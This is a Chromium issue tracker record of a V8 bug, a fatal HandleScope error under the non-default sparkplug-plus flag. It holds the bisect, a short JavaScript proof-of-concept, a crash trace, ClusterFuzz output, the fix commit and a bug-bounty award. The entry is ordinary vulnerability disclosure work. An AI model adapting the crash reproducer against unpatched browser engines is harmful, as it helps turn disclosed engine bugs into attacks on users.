# Security Check failed: Cannot create a handle without a HandleScope in v8::HandleScope::CreateHandle()

| Field | Value |
|-------|-------|
| **Issue ID** | [482839657](https://issues.chromium.org/issues/482839657) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>API |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | je...@gmail.com |
| **Assignee** | le...@chromium.org |
| **Created** | 2026-02-09 |
| **Bounty** | $8,000.00 |

## Description

## Bisect

- Version: 104967
- Commit: 3f7c4aa9e07c3a26e4924d68d3898c38a0ceb8fd
- Link: https://crrev.com/3f7c4aa9e07c3a26e4924d68d3898c38a0ceb8fd

```
commit 3f7c4aa9e07c3a26e4924d68d3898c38a0ceb8fd
Author: Hao Xu <hao.a.xu@intel.com>
Date:   Mon Jan 26 16:19:01 2026 +0800

    [sparkplug+] Add LoadIC string length handler
    
    Bug: 429351411
    Change-Id: I1ce6a19a678f12ffc95dbd5b33cc6bd0b73e3129
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7197759
    Commit-Queue: Xu, Hao A <hao.a.xu@intel.com>
    Reviewed-by: Toon Verwaest <verwaest@chromium.org>
    Reviewed-by: Leszek Swirski <leszeks@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#104967}
```

## Reproduction

1. Download: `gs://v8-asan/linux-debug/d8-linux-debug-v8-component-104967.zip`
2. Run: `d8 --expose-gc --allow-natives-syntax --fuzzing --jit-fuzzing --sparkplug-plus poc.js`

## Crash Output
```
----------------------------------------
--------------------------------------------------------------------------------

#
# Fatal error in v8::HandleScope::CreateHandle()
# Cannot create a handle without a HandleScope
#

Received signal 6

==== C stack trace ===============================

/home/test/v8/v8/out/fuzzbuild/d8(+0xcbaca1)[0x5628f93c0ca1]
/lib/x86_64-linux-gnu/libc.so.6(+0x42520)[0x7fb82cc42520]
/lib/x86_64-linux-gnu/libc.so.6(pthread_kill+0x12c)[0x7fb82cc969fc]
/lib/x86_64-linux-gnu/libc.so.6(raise+0x16)[0x7fb82cc42476]
/lib/x86_64-linux-gnu/libc.so.6(abort+0xd3)[0x7fb82cc287f3]
/home/test/v8/v8/out/fuzzbuild/d8(+0xcb4df1)[0x5628f93badf1]
/home/test/v8/v8/out/fuzzbuild/d8(+0xcd4219)[0x5628f93da219]
/home/test/v8/v8/out/fuzzbuild/d8(+0x1455701)[0x5628f9b5b701]
/home/test/v8/v8/out/fuzzbuild/d8(+0xb68930)[0x5628f926e930]
/home/test/v8/v8/out/fuzzbuild/d8(+0x2107e1a)[0x5628fa80de1a]
/home/test/v8/v8/out/fuzzbuild/d8(+0x21074dd)[0x5628fa80d4dd]
/home/test/v8/v8/out/fuzzbuild/d8(+0x62ba67d)[0x5628fe9c067d]
[end of stack trace]
Aborted



================================================================================
----------------------------------------
```

## PoC
```js
function fn1(v1) {
  var v8 = eval("(function(a){for (var i = 0; i < a.length; i++) Math.abs();})");
  v8(v1);
}

function g3() { return this; }

fn1("void 0");
fn1("null");
g3().undefined = g3();
gc();
fn1("");
// Flags: --expose-gc --allow-natives-syntax --fuzzing --jit-fuzzing --sparkplug-plus
```


## Timeline

### ts...@google.com (2026-02-09)

DNR locally at https://issues.chromium.org/issues/482839657, trying in CF.

### cl...@appspot.gserviceaccount.com (2026-02-09)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6128255530631168.

### je...@gmail.com (2026-02-10)

Please run clusterfuzz using the debug version of v8.

### ts...@google.com (2026-02-10)

CF  Job Type:	linux_asan_d8_dbg is debug.

### ts...@google.com (2026-02-10)

Over to v8 rotation for analysis despite repro difficulties

### 24...@project.gserviceaccount.com (2026-02-10)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2026-02-10)

Detailed Report: https://clusterfuzz.com/testcase?key=6128255530631168

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: Fatal error
Crash Address: 
Crash State:
  Cannot create a handle without a HandleScope
  v8::Utils::ReportApiFailure
  v8::internal::HandleScope::Extend
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=104966:104967

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6128255530631168

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary.

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### om...@chromium.org (2026-02-10)

Leszek can you take a look at this sparkplug issue? Thanks!

### om...@chromium.org (2026-02-10)

Updating to security impact none since this requires --sparkplug-plus which is disabled by default.

### ch...@google.com (2026-02-10)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### el...@chromium.org (2026-02-11)

Security shepherd: setting provisional Sev-1 in accordance with our defaults for v8, but feel free to adjust it :)

### dx...@google.com (2026-02-16)

Project: v8/v8  

Branch:  main  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7582036>

[ic] Add missing HandleScope to GetStringLengthAndUpdateFeedback

---


Expand for full commit details
```
     
    Fixed: 482839657 
    Change-Id: I81b52943f1997b49c1f8fa12cac3d7657e08ef03 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7582036 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Omer Katz <omerkatz@chromium.org> 
    Reviewed-by: Omer Katz <omerkatz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105284}

```

---

Files:

- M `src/ic/ic.cc`

---

Hash: [7e383be4525b1eabe2d57e299bde86fe4c8c0b6a](https://chromiumdash.appspot.com/commit/7e383be4525b1eabe2d57e299bde86fe4c8c0b6a)  

Date: Mon Feb 16 15:44:25 2026


---

### 24...@project.gserviceaccount.com (2026-02-17)

ClusterFuzz testcase 6128255530631168 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=105283:105284

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### wf...@chromium.org (2026-02-24)

fix is in v8 14.7.62 but issue is in 146 - does this need a merge? Surprising the bots haven't said something yet.

### wf...@chromium.org (2026-02-24)

nvm this is sec-impact none so no merge required. ignore me. trust our robot overlords.

### sp...@google.com (2026-03-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Baseline with Bisect. Renderer RCE / memory corruption in a sandboxed process


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-05-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/482839657)*
